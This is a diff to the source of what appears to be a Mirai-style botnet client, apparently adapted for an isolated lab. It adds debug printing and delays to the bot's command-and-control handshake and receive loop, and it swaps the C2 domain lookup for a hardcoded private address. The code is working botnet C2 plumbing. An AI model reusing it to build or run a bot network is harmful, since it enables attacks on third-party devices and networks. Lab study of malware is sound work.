@@ -261,7 +261,9 @@ int main(int argc, char **args)
 
                     LOCAL_ADDR = util_local_addr();
                     send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
+                    usleep(50*1000);
                     send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
+                    usleep(50*1000);
                     if (id_len > 0)
                     {
                         send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
@@ -281,6 +283,7 @@ int main(int argc, char **args)
             // Try to read in buffer length from CNC
             errno = 0;
             n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
+            printf("recv read = %d, recv len = %d\n", n, len);
             if (n == -1)
             {
                 if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
@@ -314,7 +317,9 @@ int main(int argc, char **args)
 
             // Try to read in buffer from CNC
             errno = 0;
+            printf("trying to read len = %d of buf \n", len);
             n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
+            printf("recv read n = %d, rdbuf = %s\n", n, rdbuf);
             if (n == -1)
             {
                 if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
@@ -335,8 +340,10 @@ int main(int argc, char **args)
 
             // Actually read buffer length and buffer data
             recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
+            printf("recv(len) = %d\n", n);
             len = ntohs(len);
             recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);
+            printf("recv = %d\n", n);
 
 #ifdef DEBUG
             printf("[main] Received %d bytes from CNC\n", len);
@@ -360,8 +367,21 @@ static void resolve_cnc_addr(void)
     struct resolv_entries *entries;
 
     table_unlock_val(TABLE_CNC_DOMAIN);
-    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
+    // entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
+    entries = calloc(1, sizeof (struct resolv_entries));
+
     table_lock_val(TABLE_CNC_DOMAIN);
+    entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
+    uint32_t *p;
+    uint8_t tmp_buf[4];
+    // 10.5.0.6
+    //00001010.00000101.00000000.00000110
+    tmp_buf[0] = 10;
+    tmp_buf[1] = 5;
+    tmp_buf[2] = 0;
+    tmp_buf[3] = 6;
+    p = (uint32_t *)tmp_buf;
+    entries->addrs[entries->addrs_len++] = (*p);
     if (entries == NULL)
     {
 #ifdef DEBUG
@@ -402,6 +422,9 @@ static void establish_connection(void)
         resolve_func();
 
     pending_connection = TRUE;
+    printf("%d.%d.%d.%d:%d\n",
+            srv_addr.sin_addr.s_addr & 0xff, (srv_addr.sin_addr.s_addr >> 8) & 0xff, (srv_addr.sin_addr.s_addr >> 16) & 0xff, (srv_addr.sin_addr.s_addr >> 24) & 0xff,
+            ntohs(srv_addr.sin_port));
     connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
 }
 
